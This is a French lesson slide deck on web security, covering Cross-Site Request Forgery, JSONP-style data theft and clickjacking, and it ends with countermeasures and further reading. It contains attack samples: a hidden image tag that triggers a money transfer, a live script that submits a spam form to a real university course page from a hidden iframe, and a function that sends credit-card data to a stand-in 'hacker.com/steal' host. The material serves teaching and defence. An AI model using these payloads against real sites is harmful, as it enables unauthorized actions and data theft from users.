---
layout: lesson
title: CSRF
subtitle: Cross Site Request Forgery
scripts:  ../js/mock-browser.js
---

<style>
.cli  { box-shadow: 0 0 2px 2px blue; }
.srv { box-shadow: 0 0 2px 2px yellow; }
.att    { box-shadow: 0 0 2px 2px red; }
</style>

<section>

## CSRF : attaques légitimes !

**Cross-Site Request Forgeries** : une faille intrinsèque du Web

### Les acteurs

Servane, un **server** web possédant des **données
confidentielles**.
{:.srv}

Clélie, un **utilisateur légitime authentifié** ayant des **droits sur
les données**.
{:.cli}

Athanase, un **attaquant** malicieux qui :
{:.att}

- connaît l'API du serveur (par ex., l'API est publique),
- contrôle un site tiers **sans rapport avec le server victime** (par
  ex., son propre server, ou un site avec une injection XSS).
{:.att}

### Les effets

Athanase gagne accès aux données confidentielles avec les droits de
Clélie.

</section>
<section class="compact">

## CSRF : Comment ?

### Pré-requis...

- <span class="cli">Clélie est **logguée sur le serveur**</span> (par
  ex., el garde un onglet ouvert sur une <span class="srv">page de
  Servane</span>) ;
- Clélie tombe (par hasard) sur **la page malicieuse
  d'Athanase**{:.att}.

### ...et ensuite

- La **page de l'attaquant**{:.att} déclenche une requête au <span
  class="srv">serveur</span>.

~~~
<html>
...
<h1>Recipe: Panini Reblochon Nutella</h1>
<h2>Ingrédients:</h2>
<ul>
<li>Two slices of bread</li>
...
<img width="0" height="0" src="http://servane.org/transfer?to=attacker&amount=10k"/>
~~~
{:.att}

- Le <span class="cli">browser de Clélie</span>, en voulant
  télécharger l'image, déclanche un **transfert d'argent
  authentifié**{:.att}.

</section>
<section>

<style scoped>
#ecampus.fade-out { opacity: 0 }
#ecampus, #ecampus.fade-out {
    transition: opacity 1s;
    -webkit-transition: opacity 1s;
}
</style>

## Démo CSRF : e-campus 2

1. Connectez-vous à <http://e-campus2.uvsq.fr/>{:.srv},
2. Allez vers la
   [page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946){:.srv}.
3. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
   <span class="att">ce site</span> !!!), contenant cet `<iframe>`{:.att}
   (caché par [`display:none`](){:.hide-frame}):

<iframe id="ecampus" class="att" style="width:90%;height:4em;margin:auto;display:block">
</iframe>

4. Si vous [cliquez ici](){:#csrf}, le formulaire est
   soumis, et le CSRF est exécuté.
5. Maintenant rafraîchissez
   [la page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946)
   et observez le résultat.
{: start="5"}


**Note :** Si le `<iframe>` avait été
[vraiment caché](){:.hide-frame}, vous n'auriez rien remarqué.

**Note:** Il aurait été possible de tout faire **sans attendre de clic
  de l'utilisateur !**

<script>
document.on('DOMContentLoaded', function() {
	form = Element.prototype.append.call($('#ecampus').contentDocument.body, 'form#ecampus-form');
	form.method = 'GET';
	form.action = 'http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form';
	form.append = Element.prototype.append.bind(form);

	data = {
		'typeElement'      : 'TexteLibre',
		'titreElement'     : 'Cheap Viagra',
		'createurElement'  : 'Hacker',
		'form.submitted'   : '1',
		'form.button.save' : 'label_save'
	};

	for (n in data) {
		i = form.append('input');
		i.type = 'text';
		i.name = n;
		i.value = data[n];
	}

	i = form.append('input');
	i.type = 'submit';
	i.value = 'Submit';
});

$('#csrf').on('click', function(e) {
	form.submit();
	e.preventDefault();
});

$$('.hide-frame').forEach(function(t) {
	t.on('click', function(e) {
		$('#ecampus').classList.toggle('fade-out');
		e.preventDefault()
	});
});
</script>

</section>
<section class="compact">

## AJAX et CSRF : intercepter les données

- À cause de la requête `POST`, l'attaque précédente **n'aurait pas pu
  être menée** uniquement avec `XMLHttpRequest`.
- Mais AJAX offre des nouveaux points d'accès aux CSRF !

Imaginez une **API authentifiée** qui renvoie des requêtes JavaScript :

~~~
HTTP/1.1 200 OK
Content-Type: text/javascript
Access-Control-Allow-Origin: *
...

new UserData(
  "firstName", "Pinco"
  "lastName", Pallino",
  "creditCard", "XXXX XXXX XXXX XXXX",
);
~~~
{:.http}

- Les données sont renvoyées dans un objet `UserData` à `eval`uer.
- La définition de `UserData` est dans les scripts du client.
- Ceci est similaire au paradigme
  [JSONP](http://en.wikipedia.org/wiki/JSONP).

</section>
<section>

## L'application legitime

1. Clélie charge le JavaScript fourni par le Servane
{:.cli}

~~~
<script src="http://www.servane.org/js/api.js"></script>
~~~
{:.srv}

2. Le script contient la defintion de `UserData`
{: start="2"}

~~~
function Userdata() { this.creditCard = ... }
~~~
{:.srv}

3. Clélie client fait une requête AJAX à l'API
{: .cli start="3"}

~~~
xhr = new XMLHttpRequest();
xhr.open("GET", "http://api.server.com/getUserData?user=1000");
~~~
{:.srv}

4. Clélie `eval`ue le JavaScript et traite les données
{: .cli start="4"}

~~~
var data = eval(xhr.response());
var card_number = data[5];
~~~
{:.srv}

</section>
<section>

## L'attaquant

1. Athanase crée une page sur un autre server qu'il contrôle ;
2. Inclut le JavaScript suivant (qui remplace la définition de
   `UserData`)
{:.att}
   
~~~
function UserData() {
    var img = new Image();
    img.src = "http://hacker.com/steal?" + Array.join(",", arguments);
}
~~~
{:.att}

3. Il force Clélie à faire une requête à l'API
{: start="3" .att}

~~~
xhr = new XMLHttpRequest();
xhr.open("GET", "http://api.server.com/getUserData?user=1000");
~~~
{:.att}

4. Le browser envoye les données à `http://hacker.com/steal` (à cause
   de l'`Image()`).
{: start="4" .cli}

</section>
<section>

## CSRF dans la vraie vie

**GMail 2007 rédirection de mail :** des filtres de mails arbitraires
ont pu être configurés via CSRF

- <http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/>
- <http://www.davidairey.com/google-gmail-security-hijack/>

**GMail 2007 vol de contacts :** les attaquants ont pu voler les
carnets d'adresses

- Basé sur JSONP, similaire à l'exemple AJAX + CSRF.
- <http://jeremiahgrossman.blogspot.fr/2007/01/gmail-xsrf-json-call-back-hackery.html>
- <http://jeremiahgrossman.blogspot.fr/2006/01/advanced-web-attack-techniques-using.html>

</section>
<section>

## Contremesures CSRF

### Utilisateur
{:.cli}

- Se djélogguer ;
- Utiliser plusieurs browsers.

### Développeur
{:.srv}

- Préférer POST à GET pour les requêtes qui déclenchent des actions ;
- Contrôler l'entête `Referer` ;
- Demander confirmation ;
- Faire expirer rapidement les sessions ;
- Utiliser des  captchas ;
- Ajouter des informations reliées à la session dans les URLs ;
- Cacher des jetons aléatoires jetables (**nonces**) dans les
  formulaires.

**Note :** il n'existe pas encore de protection définitive !

</section>
<section>

## Clickjacking et sécurité des Mash-up

Demander confirmation **peut ne pas être suffisant !**

Clickjacking : amener l'utilisateur à cliquer le bouton de
confirmation sans son consentement

- Inclure le formulaire de confirmation dans un `<iframe>` ;
- Utiliser CSS pour superposer le `<iframe>` à du contenu apparemment
  inoffensif ;
- Convaincre l'utilisateur à cliquer sur le contenu inoffensif ;
- Le clic va au `<iframe>` de confirmation.

**(Seule?) utilisation vérifiée :** Twitter 2009 "Don't click this"
<http://dsandler.org/outgoing/dontclick_orig.html>

</section>
<section>

## Clickjacking: Exemple

### [Suivez ce lien](../assets/clickjacking.html)

</section>
<section>

## Contremesures

Entête `X-Frame-Options`, partie du standard CSP

~~~
X-Frame-Options: SAMEORIGIN
~~~

- Empêche aux browsers d'inclure la page dans des frames cross-domain ;
- Twitter s'en sert depuis 2009...

<div id="sop" class="mock-browser content" data-src="https://twitter.com"></div>


</section>
<section>

## Lectures

### Google browser security guide (M. Zalewski)

- <https://code.google.com/p/browsersec/wiki/Part1>,
- <https://code.google.com/p/browsersec/wiki/Part2>,
- <https://code.google.com/p/browsersec/wiki/Part3>,

### CSRF

- [OWASP sur CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet),
- The tangled web: <http://lcamtuf.coredump.cx/tangled/>,

### Clickjacking

- [`X-Frame-Options`](https://developer.mozilla.org/docs/HTTP/X-Frame-Options),
- [Ajax and Mashup Security](http://www.openajax.org/whitepapers/Ajax and Mashup Security.php#Mashups),
- [OWASP sur le Clickjacking](https://www.owasp.org/index.php/Clickjacking).

</section>
